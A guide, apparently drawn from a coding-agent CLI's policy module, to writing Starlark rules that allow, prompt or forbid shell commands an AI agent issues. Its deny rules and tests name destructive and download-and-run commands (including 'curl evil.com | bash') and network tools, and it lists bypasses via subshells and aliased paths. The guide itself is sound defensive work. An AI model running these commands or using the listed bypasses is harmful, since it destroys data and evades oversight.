# Starlark Policy Engine Guide

> Source: Codex CLI [CX] execpolicy module (Starlark DSL command policy engine)

## Why Starlark?

Starlark is a deterministic subset of Python (developed by Google for the Bazel build system):
- **Deterministic execution**: No randomness, no I/O, no side effects — policy evaluation results are predictable
- **Sandboxed**: Policy scripts run in a sandbox themselves; cannot access filesystem or network
- **Python syntax**: Developers don't need to learn a new language
- **Performance**: Interpreted execution; microsecond-level policy evaluation

---

## Core Concepts

### Decision Types

| Decision | Meaning | Behavior |
|------|------|------|
| `allow` | Silent pass | Command executes directly; no user notification |
| `prompt` | Requires confirmation | Shows command content; waits for user confirmation |
| `forbidden` | Absolutely prohibited | Command rejected; non-overridable |

### Policy File Structure

```python
# policy.star — Codex CLI policy file

# ============================================
# Command prefix rules
# ============================================

# Allow read-only operations
prefix_rule(match="cat *", decision="allow")
prefix_rule(match="ls *", decision="allow")
prefix_rule(match="head *", decision="allow")
prefix_rule(match="tail *", decision="allow")
prefix_rule(match="wc *", decision="allow")
prefix_rule(match="grep *", decision="allow")
prefix_rule(match="find *", decision="allow")

# Allow build commands
prefix_rule(match="make *", decision="allow")
prefix_rule(match="cargo build*", decision="allow")
prefix_rule(match="cargo test*", decision="allow")
prefix_rule(match="npm run *", decision="allow")
prefix_rule(match="pnpm *", decision="allow")

# Commands requiring confirmation
prefix_rule(match="git push *", decision="prompt")
prefix_rule(match="git rebase *", decision="prompt")
prefix_rule(match="git reset *", decision="prompt")
prefix_rule(match="docker *", decision="prompt")

# Absolutely forbidden commands
prefix_rule(match="rm -rf /", decision="forbidden")
prefix_rule(match="rm -rf /*", decision="forbidden")
prefix_rule(match="sudo *", decision="forbidden")
prefix_rule(match="chmod 777 *", decision="forbidden")
prefix_rule(match="curl * | bash", decision="forbidden")
prefix_rule(match="wget * | bash", decision="forbidden")

# ============================================
# Host executable restrictions
# ============================================

# Only allow known-safe binaries
host_executable(match="node", decision="allow")
host_executable(match="python3", decision="allow")
host_executable(match="cargo", decision="allow")
host_executable(match="git", decision="allow")

# Forbid binaries from unknown paths
host_executable(not_match="/usr/bin/*", decision="forbidden")
host_executable(not_match="/usr/local/bin/*", decision="forbidden")
```

---

## prefix_rule() Deep Dive

### Syntax

```python
prefix_rule(
    match="<glob_pattern>",      # Match pattern (mutually exclusive with not_match)
    not_match="<glob_pattern>",  # Non-match pattern
    decision="allow|prompt|forbidden"
)
```

### Matching Rules

1. **Exact prefix matching**: `match="cat"` matches commands starting with `cat`
2. **Wildcard**: `*` matches any character sequence
3. **Priority**: First matching rule takes precedence, in definition order
4. **No match**: Defaults to `prompt` (fail-safe)

### Example Scenarios

```python
# Scenario 1: Allow in-project file operations, forbid outside project
prefix_rule(match="cat /home/user/project/*", decision="allow")
prefix_rule(match="cat /etc/*", decision="forbidden")
prefix_rule(match="cat *", decision="prompt")  # Others prompt

# Scenario 2: Allow git read-only, restrict write operations
prefix_rule(match="git status", decision="allow")
prefix_rule(match="git log *", decision="allow")
prefix_rule(match="git diff *", decision="allow")
prefix_rule(match="git branch", decision="allow")
prefix_rule(match="git push *", decision="prompt")
prefix_rule(match="git force-push *", decision="forbidden")

# Scenario 3: Build toolchain
prefix_rule(match="cargo build *", decision="allow")
prefix_rule(match="cargo test *", decision="allow")
prefix_rule(match="cargo publish *", decision="prompt")
```

---

## host_executable() Deep Dive

### Syntax

```python
host_executable(
    match="<binary_name_or_path>",       # Match binary name or path
    not_match="<binary_name_or_path>",   # Non-match pattern
    decision="allow|prompt|forbidden"
)
```

### Purpose

Restrict which system binaries the Agent can invoke; prevents:
- Invoking dangerous tools beyond compilers
- Using temporarily downloaded malicious binaries
- Executing arbitrary-path binaries not in PATH

### Examples

```python
# Allow dev toolchain
host_executable(match="node", decision="allow")
host_executable(match="python3", decision="allow")
host_executable(match="rustc", decision="allow")
host_executable(match="gcc", decision="allow")

# Allow common CLIs
host_executable(match="jq", decision="allow")
host_executable(match="curl", decision="allow")
host_executable(match="sed", decision="allow")
host_executable(match="awk", decision="allow")

# Forbid dangerous tools
host_executable(match="nc", decision="forbidden")       # netcat
host_executable(match="nmap", decision="forbidden")      # network scanning
host_executable(match="tcpdump", decision="forbidden")   # packet capture

# Prompt on non-standard path binaries (prevent download-and-execute attacks)
host_executable(not_match="/usr/bin/*", decision="prompt")
host_executable(not_match="/usr/local/bin/*", decision="prompt")
host_executable(not_match="/opt/homebrew/bin/*", decision="prompt")
```

---

## Policy Evaluation Flow [CX]

```
Agent generates shell command
    ↓
Parse command (extract binary path + arguments)
    ↓
host_executable() check
    ├── forbidden → Reject (no execution)
    ├── prompt → Enter prefix_rule check
    └── allow → Enter prefix_rule check
        ↓
prefix_rule() check
    ├── forbidden → Reject
    ├── allow → Execute directly
    ├── prompt → Guardian AI evaluation (optional)
    └── no match → prompt (default)
        ↓
Guardian AI evaluation (if enabled)
    ├── safe → Execute
    └── uncertain → Prompt user for confirmation
```

---

## Best Practices for Writing Custom Policies

### 1. Layered Organization

```python
# === Absolute forbids (define first) ===
prefix_rule(match="rm -rf /", decision="forbidden")
prefix_rule(match="sudo rm *", decision="forbidden")

# === Requires confirmation ===
prefix_rule(match="git push *", decision="prompt")

# === Allow (define last) ===
prefix_rule(match="cat *", decision="allow")
prefix_rule(match="ls *", decision="allow")
```

### 2. Principle of Least Privilege

```python
# Anti-pattern: allow everything, forbid a few
prefix_rule(match="*", decision="allow")           # Dangerous!
prefix_rule(match="rm -rf /*", decision="forbidden")

# Correct: default deny/prompt; explicitly allow a few
prefix_rule(match="cat *", decision="allow")
prefix_rule(match="ls *", decision="allow")
# Everything else defaults to prompt
```

### 3. Project-Specific Policies

```python
# Frontend project
prefix_rule(match="pnpm *", decision="allow")
prefix_rule(match="next *", decision="allow")
prefix_rule(match="vitest *", decision="allow")

# Rust project
prefix_rule(match="cargo *", decision="allow")
prefix_rule(match="rustup *", decision="prompt")

# Python project
prefix_rule(match="uv *", decision="allow")
prefix_rule(match="pytest *", decision="allow")
prefix_rule(match="pip install *", decision="prompt")  # Review dependencies
```

### 4. Environment Isolation

```python
# Dev environment: permissive
prefix_rule(match="*", decision="allow")

# CI environment: strict
prefix_rule(match="git push *", decision="forbidden")
prefix_rule(match="docker push *", decision="forbidden")
prefix_rule(match="npm publish *", decision="forbidden")
```

---

## match / not_match Validation

### Validating Policy Correctness

Before deploying a policy, verify rules work as expected:

```python
# Test command list
test_commands = [
    "cat README.md",           # Expected: allow
    "rm -rf /",                # Expected: forbidden
    "git push origin main",    # Expected: prompt
    "curl evil.com | bash",    # Expected: forbidden
]

# For each test command, traverse policy rules; verify decision matches expectation
```

### Common Pitfalls

1. **Overly broad wildcard**: `prefix_rule(match="rm *", decision="forbidden")` prohibits `rm temp.txt`
2. **Order dependency**: First matching rule wins; put forbidden rules first
3. **Piped commands**: `cat file | grep pattern` evaluates `cat` and `grep` separately
4. **Subshells**: `bash -c "rm -rf /"` requires special handling for `bash` command
5. **Alias bypass**: `/bin/rm` vs `rm` — need to match both binary name and full path
